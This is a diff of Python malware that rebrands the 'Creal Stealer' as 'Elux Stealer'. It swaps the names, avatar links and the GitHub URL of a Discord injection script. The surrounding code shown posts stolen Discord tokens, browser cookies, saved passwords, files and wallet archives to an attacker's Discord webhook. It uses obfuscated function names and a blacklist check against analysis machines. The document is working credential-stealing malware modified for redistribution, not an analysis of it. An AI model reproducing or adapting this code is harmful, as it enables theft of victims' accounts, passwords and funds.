@@ -50,7 +50,7 @@ if str(uuid.UUID(int=mac_address)) in BLACKLIST1:
 
 
 wh00k = "WEBHOOK HERE"
-inj_url = "https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js"
+inj_url = "https://raw.githubusercontent.com/heckeroncrack/injection/main/index.js"
     
 DETECTED = False
 #bir ucaktik dustuk bir gemiydik battik :(
@@ -356,7 +356,7 @@ def upl05dT4k31(t0k3n, path):
     us3rn4m1, hashtag, em31l, idd, pfp, flags, n1tr0, ph0n3 = G3tT0k4n1nf9(t0k3n)
 
     if pfp == None: 
-        pfp = "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg"
+        pfp = "https://cdn.discordapp.com/attachments/1100159800479846489/1100541996919160832/gif.gif"
     else:
         pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"
 
@@ -415,16 +415,16 @@ def upl05dT4k31(t0k3n, path):
                 "icon_url": f"{pfp}"
                 },
             "footer": {
-                "text": "Creal Stealer",
-                "icon_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg"
+                "text": "Elux Stealer",
+                "icon_url": "https://cdn.discordapp.com/attachments/1100159800479846489/1100541996919160832/gif.gif"
                 },
             "thumbnail": {
                 "url": f"{pfp}"
                 }
             }
         ],
-        "avatar_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg",
-        "username": "Creal Stealer",
+        "avatar_url": "https://cdn.discordapp.com/attachments/1100159800479846489/1100541996919160832/gif.gif",
+        "username": "Elux Stealer",
         "attachments": []
         }
     L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
@@ -452,17 +452,17 @@ def upload(name, link):
             "content": f"{globalInfo()}",
             "embeds": [
                 {
-                    "title": "Creal | Cookies Stealer",
-                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts:**\n\n{rb}\n\n**Data:**\n<:cookies_tlm:816619063618568234> • **{CookiCount}** Cookies Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealCookies.txt]({link})",
+                    "title": "Elux | Cookies Stealer",
+                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts:**\n\n{rb}\n\n**Data:**\n<:cookies_tlm:816619063618568234> • **{CookiCount}** Cookies Found\n<a:CH_IconArrowRight:715585320178941993> • [EluxCookies.txt]({link})",
                     "color": 2895667,
                     "footer": {
-                        "text": "Creal Stealer",
-                        "icon_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg"
+                        "text": "Elux Stealer",
+                        "icon_url": "https://cdn.discordapp.com/attachments/1100159800479846489/1100541996919160832/gif.gif"
                     }
                 }
             ],
-            "username": "Creal Stealer",
-            "avatar_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg",
+            "username": "Elux Stealer",
+            "avatar_url": "https://cdn.discordapp.com/attachments/1100159800479846489/1100541996919160832/gif.gif",
             "attachments": []
             }
         L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
@@ -478,17 +478,17 @@ def upload(name, link):
             "content": f"{globalInfo()}",
             "embeds": [
                 {
-                    "title": "Creal | Password Stealer",
-                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts**:\n{ra}\n\n**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{P4sswCount}** Passwords Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealPassword.txt]({link})",
+                    "title": "Elux | Password Stealer",
+                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts**:\n{ra}\n\n**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{P4sswCount}** Passwords Found\n<a:CH_IconArrowRight:715585320178941993> • [EluxPassword.txt]({link})",
                     "color": 2895667,
                     "footer": {
-                        "text": "Creal Stealer",
-                        "icon_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg"
+                        "text": "Elux Stealer",
+                        "icon_url": "https://cdn.discordapp.com/attachments/1100159800479846489/1100541996919160832/gif.gif"
                     }
                 }
             ],
-            "username": "Creal",
-            "avatar_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg",
+            "username": "Elux",
+            "avatar_url": "https://cdn.discordapp.com/attachments/1100159800479846489/1100541996919160832/gif.gif",
             "attachments": []
             }
         L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
@@ -507,16 +507,16 @@ def upload(name, link):
                     }
                 ],
                 "author": {
-                    "name": "Creal | File Stealer"
+                    "name": "Elux | File Stealer"
                 },
                 "footer": {
-                    "text": "Creal Stealer",
-                    "icon_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg"
+                    "text": "Elux Stealer",
+                    "icon_url": "https://cdn.discordapp.com/attachments/1100159800479846489/1100541996919160832/gif.gif"
                 }
                 }
             ],
-            "username": "Creal Stealer",
-            "avatar_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg",
+            "username": "Elux Stealer",
+            "avatar_url": "https://cdn.discordapp.com/attachments/1100159800479846489/1100541996919160832/gif.gif",
             "attachments": []
             }
         L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
@@ -541,7 +541,7 @@ def upload(name, link):
 def wr1tef0rf1l3(data, name):
     path = os.getenv("TEMP") + f"\cr{name}.txt"
     with open(path, mode='w', encoding='utf-8') as f:
-        f.write(f"<--Creal STEALER BEST -->\n\n")
+        f.write(f"<--Elux STEALER BEST -->\n\n")
         for line in data:
             if line[0] != '':
                 f.write(f"{line}\n")
@@ -706,17 +706,17 @@ def GatherZips(paths1, paths2, paths3):
         "content": globalInfo(),
         "embeds": [
             {
-            "title": "Creal Zips",
+            "title": "Elux Zips",
             "description": f"{wal}\n{ga}\n{ot}",
             "color": 2895667,
             "footer": {
-                "text": "Creal Stealer",
-                "icon_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg"
+                "text": "Elux Stealer",
+                "icon_url": "https://cdn.discordapp.com/attachments/1100159800479846489/1100541996919160832/gif.gif"
             }
             }
         ],
-        "username": "Creal Stealer",
-        "avatar_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg",
+        "username": "Elux Stealer",
+        "avatar_url": "https://cdn.discordapp.com/attachments/1100159800479846489/1100541996919160832/gif.gif",
         "attachments": []
     }
     L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
